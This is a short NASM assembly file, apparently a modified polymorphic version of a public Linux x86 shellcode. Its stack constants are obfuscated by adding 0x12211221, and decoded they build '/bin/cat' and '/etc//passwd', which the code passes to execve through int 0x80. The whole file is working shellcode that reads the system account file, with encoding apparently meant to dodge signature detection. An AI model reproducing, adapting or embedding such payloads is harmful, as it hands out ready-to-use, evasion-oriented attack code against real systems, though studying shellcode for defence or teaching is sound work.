; Filename: 571-modified.nasm
; Original: http://shell-storm.org/shellcode/files/shellcode-571.php

global _start			

section .text
_start:

	xor ecx, ecx
	mul ecx ; zero out edx and eax
	push edx
	mov ecx, 0x6240510E
	add ecx, 0x12211221
	push ecx
	mov ecx, 0x5C48500E
	add ecx, 0x12211221
	push ecx
	mov ebx, esp 
	push edx
	mov ecx, 0x52566152
	add ecx, 0x12211221
	push ecx
	mov ecx, 0x4F4F1D0E
	add ecx, 0x12211221
	push ecx
	mov ecx, 0x5153530E
	add ecx, 0x12211221
	push ecx
	mov ecx,esp
	mov al, 0xb
	push edx
	push ecx
	push ebx
	mov ecx, esp 
	int 0x80